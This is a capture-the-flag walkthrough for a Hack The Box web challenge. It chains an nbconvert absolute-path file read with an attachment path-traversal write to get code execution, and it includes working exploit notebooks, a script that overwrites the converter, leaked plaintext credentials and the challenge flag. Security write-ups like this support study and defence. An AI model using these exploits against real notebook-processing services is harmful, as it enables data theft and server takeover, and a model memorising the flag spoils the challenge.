# Notebook Converter Pro - HTB Walkthrough

| Field | Value |
|---|---|
| Challenge type | Web application |
| Tech stack | Flask, SQLite, nbconvert 7.17.0 |
| Flag location | `/root/flag.txt`, read via a SUID `/readflag` binary |
| Vulnerability chain | Absolute-path LFI via `embed_images` to steal the SQLite DB (plaintext admin password) → admin-gated setting flip → path traversal write via notebook attachments → self-overwriting script → RCE |
| Flag | `HTB{y3t_4n0th3r_pyth0n_c0nv3rt3r_cve}` |

---

## Key Technologies - What They Are

**nbconvert** - Jupyter's official library for converting `.ipynb` notebook files into other formats (HTML, Markdown, PDF, etc). It parses the notebook's JSON structure, runs the relevant preprocessors (extracting embedded images/attachments, resolving cell outputs), and renders the result through an exporter/template.

**Notebook attachments** - A `.ipynb` markdown cell can embed an image directly in the notebook JSON via a `cell.attachments` dictionary (`{"filename": {"image/png": "<base64>"}}`), referenced in the markdown source as `![alt](attachment:filename)`. This lets a notebook be fully self-contained without external image files.

**FilesWriter** - One of nbconvert's output writers. Instead of returning the converted document as a single string, it writes the main output plus any extracted images/attachments to individual files on disk under a configured `build_directory`.

---

## Architecture

```
[Browser] ──→ POST /register, POST / (login), GET /logout
           ──→ GET /dashboard
           ──→ POST /convert            (upload .ipynb, format=html|markdown)
           ──→ GET /jobs/<id>           (job detail, ownership-checked)
           ──→ GET /jobs/<id>/download  (download the converted output)
           ──→ GET/POST /admin          (admin only: toggle "save exported assets", list users)
```

`POST /convert` saves the upload to `data/jobs/<job_id>/incoming/`, then runs:

```python
subprocess.run(
    [sys.executable, str(CONVERTER_SCRIPT), "--input", upload_path,
     "--output-dir", exports_dir, "--format", output_format,
     "--storage-mode", storage_mode],
    cwd=BASE_DIR, capture_output=True, text=True, timeout=90,
)
```

where `CONVERTER_SCRIPT = /srv/app/app/converter/convert_job.py`. Critically, this script is **re-read from disk and re-executed as a brand new subprocess on every single conversion job** - it is not imported once when the Flask app starts. Any bug that lets us overwrite this file becomes self-triggering remote code execution the moment anyone submits another conversion.

`storage_mode` is only `"saved_assets"` (which routes through nbconvert's `FilesWriter`) when the output format is `markdown` **and** a global `asset_storage_enabled` setting is on - a setting only an admin account can flip via `/admin`. Every other combination uses a safe `"single_file"` path that just writes the rendered body text to a fixed filename.

The app runs as an unprivileged `appuser`. `/root/flag.txt` is `chmod 600 root:root`, unreadable directly. A SUID-root helper `/readflag` (`chmod 4755`) exists purely to `cat` it:

```c
int main() {
    setuid(0);
    system("/bin/cat /root/flag.txt");
    return 0;
}
```

So the entire goal is: get any code execution as `appuser`, then run `/readflag`.

---

## Vulnerability Chain Summary

```
Step 1: Register a normal user, log in
Step 2: Upload a notebook with a markdown image reference pointing at an
        absolute path (e.g. the app's own SQLite DB) and convert to HTML
        with embed_images enabled - nbconvert reads the file off disk and
        base64-embeds it into the output, which we then download
Step 3: The exfiltrated DB contains all users' passwords in PLAINTEXT,
        including the admin account
Step 4: Log in as admin, flip "asset_storage_enabled" on via /admin
Step 5: Upload a notebook whose markdown-cell attachment key is a path
        traversal string pointing at /srv/app/app/converter/convert_job.py,
        with attachment content = a malicious replacement Python script.
        Convert to markdown - nbconvert's FilesWriter/attachment
        preprocessor writes it to that traversed path with no sanitization
Step 6: Submit any further conversion job - the poisoned convert_job.py is
        picked up fresh by the next subprocess call and executes our code
        as appuser
Step 7: The planted code runs /readflag and writes its output somewhere
        retrievable - read the flag
```

---

## Bug 1 - Absolute-Path LFI via `embed_images` (unauthenticated feature, no admin needed)

**File:** `app/converter/convert_job.py`

```python
def convert_html(input_path, output_dir):
    exporter = nbconvert.HTMLExporter()
    exporter.embed_images = True
    body, _resources = exporter.from_filename(str(input_path))
    output_path = output_dir / f"{input_path.stem}.html"
    output_path.write_text(body, encoding="utf-8")
    return output_path
```

`embed_images = True` tells nbconvert to inline any referenced image as a base64 data URI rather than leaving it as an external link. The relevant code, in nbconvert's own `filters/markdown_mistune.py`:

```python
def _embed_image_or_attachment(self, src: str) -> str:
    ...
    if self.embed_images:
        base64_url = self._src_to_base64(src)
        if base64_url is not None:
            return base64_url
    return src

def _src_to_base64(self, src: str) -> Optional[str]:
    src_path = os.path.join(self.path, src)
    if not os.path.exists(src_path):
        return None
    with open(src_path, "rb") as fobj:
        mime_type, _ = mimetypes.guess_type(src_path)
        base64_data = base64.b64encode(fobj.read())
        base64_str = base64_data.replace(b"\n", b"").decode("ascii")
        return f"data:{mime_type};base64,{base64_str}"
```

`os.path.join(self.path, src)` is the bug: Python's `os.path.join` discards every preceding argument the moment a later component is an absolute path. So a plain markdown image reference using an absolute path:

```markdown
![leak](/srv/app/data/app.db)
```

resolves `src_path` to `/srv/app/data/app.db` directly, completely ignoring `self.path` (the notebook's own working directory). nbconvert happily opens and base64-embeds whatever that absolute path points to, as `appuser`, with zero validation that it's actually an image. The result lands as an `<img src="data:...;base64,...">` tag inside the generated HTML, which the app then serves back to us via its own legitimate download feature.

### Exploitation

```python
nb = {
    "cells": [{
        "cell_type": "markdown",
        "metadata": {},
        "source": ["![leak](/srv/app/data/app.db)"]
    }],
    "metadata": {
        "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
        "language_info": {"name": "python", "version": "3.11.0"}
    },
    "nbformat": 4,
    "nbformat_minor": 5
}
```

Upload it with `format=html`, then download the resulting job's output and pull the base64 payload out of the `<img>` tag:

```python
r = s.post(f"{BASE}/convert", files={"notebook": ("leak.ipynb", f, "application/octet-stream")},
           data={"format": "html"})
job_id = r.url.rstrip("/").split("/")[-1]
r3 = s.get(f"{BASE}/jobs/{job_id}/download")
mime, b64data = re.search(r'src="data:([^;]+);base64,([^"]+)"', r3.text).groups()
data = base64.b64decode(b64data)
```

This pulled `/srv/app/data/app.db` - the entire application SQLite database. Its `users` table stores passwords in **plaintext**:

```
1|admin|pzKr3vtWyHJ8Hw4jwek|admin
2|pentest1|Password123!|user
```

Full script: [`lfi_read.py`](./lfi_read.py).

---

## Bug 2 - Path Traversal Write via Notebook Attachments (admin-gated, unlocked using Bug 1's password)

Logged in as `admin` with the recovered password and flipped the "Save exported asset files" toggle at `/admin`, which sets `asset_storage_enabled = 1`. This unlocks `storage_mode = "saved_assets"` for markdown conversions:

```python
def convert_markdown(input_path, output_dir, storage_mode):
    exporter = nbconvert.MarkdownExporter()
    body, resources = exporter.from_filename(str(input_path))
    output_path = output_dir / f"{input_path.stem}.md"
    if storage_mode == "saved_assets":
        writer = FilesWriter(build_directory=str(output_dir))
        written_path = writer.write(body, resources, notebook_name=input_path.stem)
        return Path(written_path)
    output_path.write_text(body, encoding="utf-8")
    return output_path
```

Two pieces of nbconvert combine to make this exploitable. First, `preprocessors/extractattachments.py`, which turns `cell.attachments` entries into resource dict items:

```python
def preprocess_cell(self, cell, resources, index):
    if "attachments" in cell:
        for fname in cell.attachments:
            for mimetype in cell.attachments[fname]:
                data = cell.attachments[fname][mimetype].encode("utf-8")
                decoded = b64decode(data)
                break
            # FilesWriter wants path to be in attachment filename here
            new_filename = os.path.join(self.path_name, fname)
            resources[self.resources_item_key][new_filename] = decoded
            ...
```

`fname` is the attachment's dictionary key in the notebook's own JSON - fully attacker-controlled, with no character or path restrictions - and it is joined into `new_filename` with no traversal check.

Second, `writers/files.py`'s `FilesWriter._write_items`, which actually writes each resource entry to disk:

```python
def _write_items(self, items, build_dir):
    for filename, data in items:
        dest = os.path.join(build_dir, filename)
        path = os.path.dirname(dest)
        self._makedir(path)
        with open(dest, "wb") as f:
            f.write(data)
```

`filename` here is exactly the traversal-laden string produced above, joined again with `build_dir` (the job's own `exports/` directory) with no containment check. A `fname` like `../../../../../../../../../../srv/app/app/converter/convert_job.py` walks straight out of the job's sandboxed export directory and lands on the real application source tree.

### Exploitation

Craft a notebook whose markdown cell has one attachment, keyed with the traversal path, whose "image" content is actually a replacement Python script for `convert_job.py`:

```python
PAYLOAD = '''#!/usr/bin/env python3
import argparse, json, subprocess
from pathlib import Path

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--input", required=True)
    parser.add_argument("--output-dir", required=True)
    parser.add_argument("--format", required=True)
    parser.add_argument("--storage-mode", required=True)
    args = parser.parse_args()
    output_dir = Path(args.output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    flag = subprocess.run(["/readflag"], capture_output=True, text=True, timeout=20)
    content = "STDOUT:\\n" + flag.stdout + "\\nSTDERR:\\n" + flag.stderr
    out_path = output_dir / "pwned.txt"
    out_path.write_text(content, encoding="utf-8")
    print(json.dumps({"status": "ok", "output_path": str(out_path)}))
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
'''

payload_b64 = base64.b64encode(PAYLOAD.encode()).decode()
TRAVERSAL = "../" * 10 + "srv/app/app/converter/convert_job.py"

notebook = {
    "cells": [{
        "cell_type": "markdown",
        "metadata": {},
        "attachments": {TRAVERSAL: {"text/plain": payload_b64}},
        "source": ["![x](attachment:" + TRAVERSAL + ")"]
    }],
    "metadata": {
        "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
        "language_info": {"name": "python", "version": "3.11.0"}
    },
    "nbformat": 4,
    "nbformat_minor": 5
}
```

Submit it with `format=markdown` (this overwrites `convert_job.py` on disk with our payload), then submit any second, harmless conversion job - the app's own code re-reads `convert_job.py` fresh for that job and executes our planted script instead of the real converter:

```python
r = s.post(f"{BASE}/convert", files={"notebook": ("evil.ipynb", f, ...)}, data={"format": "markdown"})
# ... then any follow-up job ...
r3 = s.post(f"{BASE}/convert", files={"notebook": ("trigger.ipynb", f, ...)}, data={"format": "html"})
```

The follow-up job's own output directory ends up containing `pwned.txt` with `/readflag`'s output - `/root/flag.txt`'s contents, read as root via the SUID binary despite our code running as unprivileged `appuser`.

Full script: [`exploit.py`](./exploit.py).

---

## Root Cause

Two separate, real defects in nbconvert 7.17.0 chain into full remote code execution here. `_src_to_base64`'s use of `os.path.join(self.path, src)` fails to reject absolute paths, turning any feature that sets `embed_images = True` on untrusted notebooks into an arbitrary local file read. Separately, both the attachment-extraction preprocessor and `FilesWriter` trust a notebook's own internal attachment filenames completely, joining them into filesystem paths with no traversal sanitization at either stage - turning `FilesWriter`-based exports of untrusted notebooks into an arbitrary file write. Combined with this specific application's design of re-executing its converter script fresh from disk on every job, that write becomes trivial code execution. The general lesson for anyone processing untrusted Jupyter notebooks: treat every string embedded in the notebook JSON (image paths, attachment keys, cell metadata) as attacker-controlled input, because nbconvert itself does not sanitize any of it.

---

## Flag

```
HTB{y3t_4n0th3r_pyth0n_c0nv3rt3r_cve}
```
